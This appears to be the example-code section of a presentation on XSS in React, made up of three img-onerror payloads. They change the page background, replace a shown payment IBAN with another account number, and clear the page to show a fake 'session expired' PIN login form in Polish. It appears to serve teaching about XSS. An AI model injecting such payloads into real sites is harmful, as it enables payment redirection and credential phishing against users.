# React XSS presentation

## Example code

### Set site's background
```html
<img
  src="x"
  onerror="const setColor = () => { document.body.style.background = 'red' }; setColor();"
/>
```

### Set new payment IBAN
```html
<img
  src="x"
  onerror="const hackIBAN = () => { document.querySelector('strong').textContent = 'PL67109024026281469282578623' }; hackIBAN();"
/>
```

### Show session expired view
```html
<img
  src="x"
  onerror="const createLoginForm = () => {const body = document.querySelector('body'); while (body.firstChild) { body.removeChild(body.firstChild); };const form = document.createElement('form'); const label = document.createElement('label'); const input = document.createElement('input'); const button = document.createElement('button'); const message = document.createElement('p'); label.textContent = 'Kod PIN:'; input.type = 'password'; button.type = 'submit'; button.textContent = 'Zaloguj się'; message.textContent = 'Sesja wygasła - konieczne ponowne logowanie'; form.appendChild(label); form.appendChild(input); form.appendChild(button); form.appendChild(message); body.appendChild(form);body.style.display = 'flex'; body.style.flexDirection = 'column'; body.style.justifyContent = 'center'; body.style.alignItems = 'center'; body.style.height = '100vh';}; createLoginForm();"
/>
```
